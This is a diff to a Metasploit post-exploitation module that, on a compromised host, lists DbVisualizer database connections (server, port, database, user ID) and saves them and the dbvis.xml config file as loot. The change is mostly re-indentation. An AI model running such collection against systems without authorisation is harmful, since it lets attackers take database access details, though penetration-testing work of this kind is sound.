@@ -125,39 +125,36 @@ class Metasploit3 < Msf::Post
         end
       end
     end
-  end
 
-  # print out
-  dbs.each do |db|
-    if ::Rex::Socket.is_ipv4?(db[:Server].to_s)
-      print_good("Reporting #{db[:Server]} ")
-      report_host(:host =>  db[:Server]);
+    # print out
+    dbs.each do |db|
+      if ::Rex::Socket.is_ipv4?(db[:Server].to_s)
+        print_good("Reporting #{db[:Server]} ")
+        report_host(:host =>  db[:Server]);
+      end
+
+      db_table << [ db[:Alias] , db[:Type] , db[:Server], db[:Port], db[:Database], db[:Namespace], db[:Userid]]
     end
 
-    db_table << [ db[:Alias] , db[:Type] , db[:Server], db[:Port], db[:Database], db[:Namespace], db[:Userid]]
-  end
-
-  if db_table.rows.empty?
-    print_status("No database settings found")
-  else
-    print_line("\n" + db_table.to_s)
-
-    print_good("Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun !")
-    print_good("")
-    # store found databases
-    p = store_loot(
+    if db_table.rows.empty?
+      print_status("No database settings found")
+    else
+      print_line("\n")
+      print_line(db_table.to_s)
+      print_good("Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun !")
+      print_good("")
+      # store found databases
+      p = store_loot(
         "dbvis.databases",
         "text/csv",
         session,
         db_table.to_csv,
         "dbvis_databases.txt",
         "dbvis databases")
-    print_good("Databases settings stored in: #{p.to_s}")
-  end
+      print_good("Databases settings stored in: #{p.to_s}")
+    end
 
-  print_status("Downloading #{dbvis_file}")
-  p = store_loot("dbvis.xml", "text/xml", session, read_file(dbvis_file), "#{dbvis_file}", "dbvis config")
-  print_good "dbvis.xml saved to #{p.to_s}"
-  end
-
+    print_status("Downloading #{dbvis_file}")
+    p = store_loot("dbvis.xml", "text/xml", session, read_file(dbvis_file), "#{dbvis_file}", "dbvis config")
+    print_good "dbvis.xml saved to #{p.to_s}"
 end
